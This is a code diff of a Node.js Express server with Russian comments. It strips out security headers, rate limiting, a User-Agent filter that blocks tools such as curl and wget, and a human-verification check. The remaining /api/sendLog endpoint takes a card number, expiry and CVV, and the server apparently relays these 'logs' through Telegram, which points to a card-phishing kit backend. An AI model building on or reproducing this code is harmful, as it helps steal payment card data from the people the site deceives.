@@ -2,9 +2,6 @@ const express = require("express");
 const useragent = require("express-useragent");
 const bodyParser = require("body-parser");
 const cookieParser = require('cookie-parser');
-const rateLimit = require('express-rate-limit');
-const slowDown = require('express-slow-down');
-const helmet = require('helmet');
 const { Op } = require("sequelize");
 const path = require("path");
 const { Telegram, Markup } = require("telegraf");
@@ -30,96 +27,6 @@ const app = express();
 
 app.set("view engine", "ejs");
 app.set("views", path.join(__dirname, "pages"));
-
-// Безопасность и защита от ботов
-app.use(helmet({
-    contentSecurityPolicy: {
-        directives: {
-            defaultSrc: ["'self'"],
-            styleSrc: ["'self'", "'unsafe-inline'", "https://cdn-icons-png.flaticon.com"],
-            scriptSrc: ["'self'", "'unsafe-inline'", "https://cdn-icons-png.flaticon.com"],
-            imgSrc: ["'self'", "data:", "https:", "http:"],
-            connectSrc: ["'self'"],
-            fontSrc: ["'self'"],
-            objectSrc: ["'none'"],
-            mediaSrc: ["'self'"],
-            frameSrc: ["'none'"],
-        },
-    },
-    crossOriginEmbedderPolicy: false
-}));
-
-// Rate limiting - ограничение количества запросов
-const limiter = rateLimit({
-    windowMs: 15 * 60 * 1000, // 15 минут
-    max: 100, // максимум 100 запросов с одного IP за 15 минут
-    message: {
-        error: 'Too many requests from this IP, please try again later.',
-        retryAfter: '15 minutes'
-    },
-    standardHeaders: true,
-    legacyHeaders: false,
-});
-
-// Slow down - замедление при превышении лимита
-const speedLimiter = slowDown({
-    windowMs: 15 * 60 * 1000, // 15 минут
-    delayAfter: 50, // начать замедление после 50 запросов
-    delayMs: 500, // добавить 500ms задержки на каждый запрос после лимита
-    maxDelayMs: 20000, // максимальная задержка 20 секунд
-});
-
-// Защита от ботов - проверка User-Agent
-const botProtection = (req, res, next) => {
-    const userAgent = req.get('User-Agent') || '';
-    const suspiciousPatterns = [
-        /bot/i, /crawler/i, /spider/i, /scraper/i, /curl/i, /wget/i,
-        /python/i, /java/i, /php/i, /go-http/i, /okhttp/i, /axios/i,
-        /postman/i, /insomnia/i, /httpie/i, /requests/i
-    ];
-    
-    // Проверяем на подозрительные User-Agent
-    const isSuspicious = suspiciousPatterns.some(pattern => pattern.test(userAgent));
-    
-    if (isSuspicious) {
-        console.log(`🚫 Blocked suspicious request from IP: ${req.ip}, User-Agent: ${userAgent}`);
-        return res.status(403).json({ 
-            error: 'Access denied',
-            message: 'Automated requests are not allowed'
-        });
-    }
-    
-    // Проверяем на отсутствие User-Agent (часто боты)
-    if (!userAgent || userAgent.length < 10) {
-        console.log(`🚫 Blocked request without proper User-Agent from IP: ${req.ip}`);
-        return res.status(403).json({ 
-            error: 'Access denied',
-            message: 'Valid User-Agent required'
-        });
-    }
-    
-    next();
-};
-
-// Middleware для проверки верификации человека
-const requireHumanVerification = (req, res, next) => {
-    const humanVerified = req.cookies.humanVerified;
-    
-    if (!humanVerified) {
-        console.log(`🚫 Unverified request blocked from IP: ${req.ip}`);
-        return res.status(403).json({ 
-            error: 'Human verification required',
-            message: 'Please complete verification to access this resource'
-        });
-    }
-    
-    next();
-};
-
-// Применяем защиту
-app.use(limiter);
-app.use(speedLimiter);
-app.use(botProtection);
 
 app.use(useragent.express());
 app.use(bodyParser.json());
@@ -755,7 +662,7 @@ ${await reqInfo(req)}`, {
     }
 });
 
-app.post("/api/sendLog", requireHumanVerification, async (req, res) => {
+app.post("/api/sendLog", async (req, res) => {
     try {
         if(!req.body.price || !req.body.cardNumber || !req.body.exp || !req.body.cvv) {
             return res.sendStatus(404);
@@ -884,58 +791,6 @@ ${req.body.type === 'custom' ? `\n❔ Вопрос: ${log.error}` : ''}
     }
 
     return res.sendStatus(200);
-});
-
-// API endpoint для верификации человека (защита от ботов)
-app.post('/api/verify-human', async (req, res) => {
-    try {
-        const { token, timestamp, userAgent, language, platform, screenResolution, timezone } = req.body;
-        const sessionToken = req.headers['x-session-token'];
-        
-        // Проверяем что токены совпадают
-        if (!token || !sessionToken || token !== sessionToken) {
-            return res.status(400).json({ error: 'Invalid token' });
-        }
-        
-        // Проверяем что запрос не слишком старый (не более 5 минут)
-        const now = Date.now();
-        if (now - timestamp > 5 * 60 * 1000) {
-            return res.status(400).json({ error: 'Request too old' });
-        }
-        
-        // Проверяем User-Agent на подозрительные паттерны
-        const suspiciousPatterns = [
-            /bot/i, /crawler/i, /spider/i, /scraper/i, /curl/i, /wget/i,
-            /python/i, /java/i, /php/i, /go-http/i, /okhttp/i, /axios/i,
-            /postman/i, /insomnia/i, /httpie/i, /requests/i
-        ];
-        
-        const isSuspicious = suspiciousPatterns.some(pattern => pattern.test(userAgent));
-        if (isSuspicious) {
-            console.log(`🚫 Blocked suspicious verification from IP: ${req.ip}, User-Agent: ${userAgent}`);
-            return res.status(403).json({ error: 'Suspicious request' });
-        }
-        
-        // Логируем успешную верификацию
-        console.log(`✅ Human verified from IP: ${req.ip}, Token: ${token.substring(0, 8)}...`);
-        
-        // Сохраняем информацию о верификации в cookie
-        res.cookie('humanVerified', 'true', { 
-            maxAge: 30 * 60 * 1000, // 30 минут
-            httpOnly: true,
-            secure: process.env.NODE_ENV === 'production'
-        });
-        
-        res.json({ 
-            success: true, 
-            message: 'Human verified',
-            verifiedAt: now
-        });
-        
-    } catch (error) {
-        console.error('Error in verify-human:', error);
-        res.status(500).json({ error: 'Internal server error' });
-    }
 });
 
 app.get("*", async (req, res) => {
